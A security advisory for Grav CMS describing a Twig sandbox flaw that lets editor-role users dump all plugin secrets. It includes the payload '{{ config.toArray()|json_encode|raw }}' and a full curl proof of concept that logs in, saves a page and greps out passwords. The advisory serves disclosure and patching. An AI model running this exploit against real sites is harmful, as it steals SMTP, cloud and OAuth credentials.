# [H] Grav: Twig sandbox allows editor-role users to exfiltrate all plugin secrets via Config::toArray()

## Summary
Severity: High
Advisory: GHSA-j274-39qw-32c9
CVE: CVE-2026-44738
CWE: CWE-200
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-13
Source: https://github.com/advisories/GHSA-j274-39qw-32c9
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <2.0.0-rc.2

## Details
## Summary

The Twig sandbox allow-list permits any user with the `admin.pages` role to call `config.toArray()` from within a page body, dumping the entire merged site configuration — including all plugin secrets (SMTP passwords, AWS keys, OAuth client secrets, API tokens) — into the rendered HTML. No administrator privileges are required.

## Details

The Twig sandbox allow-list in `system/config/security.yaml` explicitly permits `Config::toArray()` for the `Grav\Common\Config\Config` class:

```yaml
- class: 'Grav\Common\Config\Config'
  methods: 'get, toarray, value, default, offsetget, offsetexists'
```

The `config` object — which holds the full merged configuration tree including every key under `plugins.*` — is injected into every sandboxed render in `system/src/Grav/Common/Twig/Twig.php` (line 292):

```php
$twig_vars = [..., 'config' => $config, ...]
```

Any editor with `admin.pages` can save a page with `process.twig: true` in the frontmatter and the following payload in the body:

```
{{ config.toArray()|json_encode|raw }}
```

When the page is rendered, the full config tree is dumped as JSON in the HTML, including all plugin secrets stored under `user/config/plugins/*.yaml`.

## PoC

```bash
# Step 1 — Get login nonce
NONCE=$(curl -sc /tmp/cookies.txt http://TARGET/admin \
  | grep -oP '(?<=name="login-nonce" value=")[^"]+')

# Step 2 — Login as editor (no admin.super)
curl -sc /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST http://TARGET/admin \
  --data-urlencode "data[username]=EDITOR_USER" \
  --data-urlencode "data[password]=EDITOR_PASS" \
  --data-urlencode "task=login" \
  --data-urlencode "login-nonce=${NONCE}" -o /dev/null

# Step 3 — Get admin nonce
ADMIN_NONCE=$(curl -s -b /tmp/cookies.txt http://TARGET/admin/pages \
  | grep -oP '(?<=admin-nonce" value=")[^"]+' | head -1)

# Step 4 — Save page with process.twig:true and payload
curl -s -b /tmp/cookies.txt \
  -X POST http://TARGET/admin/pages/poc \
  --data-urlencode "admin-nonce=${ADMIN_NONCE}" \
  --data-urlencode "task=save" \
  --data-urlencode "data[frontmatter]=title: poc
process:
    twig: true
published: true" \
  --data-urlencode "data[content]={{ config.toArray()|json_encode|raw }}" \
  --data-urlencode "data[folder]=poc" \
  --data-urlencode "data[route]=/" \
  --data-urlencode "data[name]=default" -o /dev/null

# Step 5 — Retrieve secrets from rendered page
curl -s http://TARGET/poc | grep -o '"password":"[^"]*"'
```

## Impact

Any user with the editor role (`admin.pages`) can exfiltrate all plugin credentials stored in the site configuration without any administrator privileges. Affected secrets include SMTP passwords, AWS access/secret keys, OAuth client secrets, reCAPTCHA keys, and any API token stored in plugin YAML config. Each extracted credential independently compromises the connected service.

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-j274-39qw-32c9
- https://nvd.nist.gov/vuln/detail/CVE-2026-44738
- https://github.com/getgrav/grav
- https://github.com/getgrav/grav/releases/tag/2.0.0-rc.2
